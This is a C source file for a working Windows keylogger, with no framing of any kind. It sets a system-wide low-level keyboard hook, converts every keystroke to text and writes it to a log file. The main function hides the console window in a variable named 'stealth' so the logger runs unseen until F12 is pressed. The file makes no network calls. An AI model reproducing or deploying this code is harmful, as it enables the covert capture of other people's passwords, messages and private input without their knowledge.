#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "log.h"

HHOOK keyHook;
BYTE keyboard_state[256] = {0};
HKL current_keyboard_layout = 0;
WCHAR character_buffer[5] = {0};

const char *SpecialKeys(int vkCode) {
    switch (vkCode) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS LOCK]";
        case VK_TAB: return "[TAB]";
        case VK_BACK: return "[BACKSPACE]";
        case VK_DELETE: return "[DELETE]";
        case VK_LEFT: return "[LEFT]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_UP: return "[UP]";
        case VK_DOWN: return "[DOWN]";
        case VK_ESCAPE: return "[ESC]";
        case VK_F1: return "[F1]";
        case VK_F12: return "[F12]";
        default: return NULL;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT *key_struct = (KBDLLHOOKSTRUCT *)lParam;
            int vkCode = key_struct->vkCode;

            const char *special_key_name = SpecialKeys(vkCode);
            if (special_key_name != NULL) {
                WriteToLog(special_key_name);
            }

            current_keyboard_layout = GetKeyboardLayout(0);
            GetKeyboardState(keyboard_state);

            int translated_chars = ToUnicodeEx(
                vkCode,
                key_struct->scanCode,
                keyboard_state,
                character_buffer,
                ARRAYSIZE(character_buffer),
                0,
                current_keyboard_layout
            );

            if (translated_chars > 0) {
                char char_output[5];
                if (WideCharToMultiByte(CP_ACP, 0, character_buffer, translated_chars, char_output, 5, NULL, NULL)) {
                    char_output[translated_chars] = '\0';
                    WriteToLog(char_output);
                }
            }
        }
    }

    return CallNextHookEx(keyHook, nCode, wParam, lParam);
}

void SetHook() {
    keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    if (keyHook == NULL) {
        fprintf(stderr, "Fatal Error: Failed to set keyboard hook! Windows Error Code: %lu\n", GetLastError());
        exit(EXIT_FAILURE);
    }
}

int main() {
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, SW_HIDE);

    InitializeLog();
    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (GetAsyncKeyState(VK_F12) & 0x8000) {
            break;
        }
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyHook);
    CloseLog();

    return 0;
}